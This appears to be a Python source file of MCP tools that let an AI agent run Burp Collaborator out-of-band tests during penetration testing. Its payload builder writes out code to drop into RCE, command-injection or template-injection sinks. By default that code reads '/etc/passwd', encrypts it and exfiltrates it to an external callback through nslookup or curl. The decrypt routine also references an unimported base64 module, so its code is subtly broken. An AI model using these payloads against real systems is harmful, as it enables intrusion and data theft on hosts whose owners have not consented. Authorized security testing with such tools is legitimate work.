"""OOB test tools: auto-collaborator, encrypted-OAST build/decrypt."""

from mcp.server.fastmcp import FastMCP

from praetor import client
from ._oast import (_oast_key_dir, _get_oast_fernet, _b32_dns_encode,
                    _b32_dns_decode, _OAST_KEY_NAME)


def register(mcp: FastMCP):

    @mcp.tool()
    async def auto_collaborator_test(
        index: int,
        parameter: str,
        injection_point: str = "query",
        poll_seconds: int = 5,
    ) -> str:
        """Inject Collaborator payload into a parameter, send request, and poll for OOB interactions. Requires Burp Professional.

        Args:
            index: Proxy history index of the request to test
            parameter: Parameter name to inject the payload into
            injection_point: Where to inject — 'query', 'body', or 'header'
            poll_seconds: Seconds to wait before polling (default 5, max 15)
        """
        data = await client.post("/api/collaborator/auto-test", json={
            "index": index,
            "parameter": parameter,
            "injection_point": injection_point,
            "poll_seconds": poll_seconds,
        })
        if "error" in data:
            return f"Error: {data['error']}"

        vulnerable = data.get("vulnerable", False)
        interactions = data.get("interactions", [])

        lines = ["Collaborator Auto-Test Results:\n"]
        lines.append(f"  Payload: {data.get('payload_injected', '')}")
        lines.append(f"  Parameter: {data.get('parameter', '')}")
        lines.append(f"  Injection Point: {data.get('injection_point', '')}")
        lines.append(f"  Response Status: {data.get('response_status', 'N/A')}")
        lines.append(f"  Poll Duration: {data.get('poll_seconds', 0)}s")
        lines.append("")

        if vulnerable:
            lines.append(f"[!!!] VULNERABLE - {len(interactions)} out-of-band interaction(s) detected!")
            lines.append("")
            for interaction in interactions:
                lines.append(f"  [{interaction.get('type')}] from {interaction.get('client_ip')}")
                lines.append(f"    Timestamp: {interaction.get('timestamp')}")
                lines.append("")
            lines.append("The target made external connections to the Collaborator server.")
            lines.append("This confirms a blind vulnerability (SSRF, XXE, SQLi, etc.).")
        else:
            lines.append("[OK] No interactions detected within the poll window.")
            lines.append("The target did not make out-of-band connections (or they were delayed).")
            lines.append("Consider increasing poll_seconds or testing other parameters.")

        return "\n".join(lines)

    @mcp.tool()
    async def build_encrypted_oast_payload(
        callback_domain: str,
        exfil_scheme: str = "dns",
        secret_expr: str = "open('/etc/passwd','rb').read()",
        sample_value: str = "",
    ) -> str:
        """Build a blind-exfil OAST payload that encrypts the leaked DATA with a
        local key before it hits the wire, so the OOB provider (Collaborator /
        interact.sh) only ever logs ciphertext.

        The real callback domain MUST come from generate_collaborator_payload
        (Burp Pro) or an operator-provided callback (interact.sh / webhook.site).
        This tool never fabricates one — pass the subdomain you obtained.

        Threat model: the symmetric key rides inside the injection payload (the
        target needs it to encrypt) but never reaches the OOB provider, which
        sees only the callback traffic. The operator decrypts captures locally
        with decrypt_oast_capture. Use in contexts where the target can run the
        encrypt step (RCE / command injection / SSTI).

        Args:
            callback_domain: real Collaborator/callback subdomain (NOT fabricated)
            exfil_scheme: 'dns' (base32 labels) or 'http' (query param)
            secret_expr: target-side Python expression returning the secret bytes
            sample_value: optional plaintext to also render as the exact on-wire
                          ciphertext, so the operator can verify the round trip
        """
        if not callback_domain or not callback_domain.strip():
            return (
                "Error: no callback_domain. Rule 9a — never fabricate a callback. "
                "Call generate_collaborator_payload() first (Burp Pro), or supply "
                "your own interact.sh / webhook.site subdomain, then pass it here."
            )
        callback = callback_domain.strip()
        scheme = exfil_scheme.strip().lower()
        if scheme not in ("dns", "http"):
            return f"Error: exfil_scheme must be 'dns' or 'http', got {exfil_scheme!r}"

        fernet, key_str, err = _get_oast_fernet()
        if err:
            return f"Error: {err}"

        lines = [
            "Encrypted OAST Payload (data encrypted client-side; provider sees ciphertext):",
            f"  Callback:   {callback}",
            f"  Scheme:     {scheme}",
            f"  Local key:  {_oast_key_dir() / _OAST_KEY_NAME} (0600)",
            "",
        ]

        if scheme == "dns":
            lines += [
                "Target-side encrypt + DNS exfil (drop into an RCE/CMDi/SSTI sink):",
                "```",
                "python3 - <<'PY'",
                "from cryptography.fernet import Fernet",
                "import base64, os",
                f"KEY = {key_str!r}.encode()",
                f"secret = {secret_expr}",
                "tok = base64.b32encode(Fernet(KEY).encrypt(secret)).decode().rstrip('=').lower()",
                f"host = {callback!r}",
                "for i in range(0, len(tok), 60):",
                "    os.system('nslookup %s.%s' % (tok[i:i+60], host))",
                "PY",
                "```",
                "",
                "Capture the DNS labels via get_collaborator_interactions, concatenate",
                "them, then decrypt_oast_capture(<concatenated-labels>).",
            ]
        else:  # http
            lines += [
                "Target-side encrypt + HTTP exfil (query param carries the token):",
                "```",
                'curl -s "http://%s/x?d=$(python3 -c "'
                "from cryptography.fernet import Fernet;"
                f"print(Fernet({key_str!r}.encode()).encrypt({secret_expr}).decode())"
                '")"' % callback,
                "```",
                "",
                "Capture the ?d= value via get_collaborator_interactions, then",
                "decrypt_oast_capture(<token>).",
            ]

        if sample_value:
            token = fernet.encrypt(sample_value.encode("utf-8"))
            if scheme == "dns":
                wire = _b32_dns_encode(token)
            else:
                wire = token.decode("ascii")
            lines += [
                "",
                "Round-trip check (sample_value encrypted with the local key):",
                f"  On-wire ciphertext: {wire}",
                "  Verify with decrypt_oast_capture(<the string above>).",
            ]

        return "\n".join(lines)

    @mcp.tool()
    async def decrypt_oast_capture(ciphertext: str) -> str:
        """Decrypt an OAST capture (ciphertext observed at the Collaborator /
        callback) using the local OAST key. Operator-side counterpart to
        build_encrypted_oast_payload.

        Accepts either a raw Fernet token (HTTP exfil) or concatenated base32
        DNS labels (DNS exfil) — dots/whitespace are stripped automatically.

        Args:
            ciphertext: the captured on-wire ciphertext string
        """
        if not ciphertext or not ciphertext.strip():
            return "Error: empty ciphertext."
        fernet, _key_str, err = _get_oast_fernet()
        if err:
            return f"Error: {err}"

        from cryptography.fernet import InvalidToken

        raw = ciphertext.strip()
        # Attempt 1: raw Fernet token (HTTP scheme / urlsafe-base64).
        try:
            plain = fernet.decrypt(raw.encode("ascii"))
            return f"Decrypted ({len(plain)} bytes):\n{plain.decode('utf-8', errors='replace')}"
        except (InvalidToken, ValueError, UnicodeEncodeError):
            pass
        # Attempt 2: base32 DNS labels.
        try:
            token = _b32_dns_decode(raw)
            plain = fernet.decrypt(token)
            return f"Decrypted ({len(plain)} bytes):\n{plain.decode('utf-8', errors='replace')}"
        except (InvalidToken, ValueError, base64.binascii.Error):
            return (
                "Error: decryption failed. Ciphertext is not a valid Fernet token "
                "for the current local key (wrong key, corrupted capture, or "
                "partial DNS labels). Confirm all labels were captured."
            )
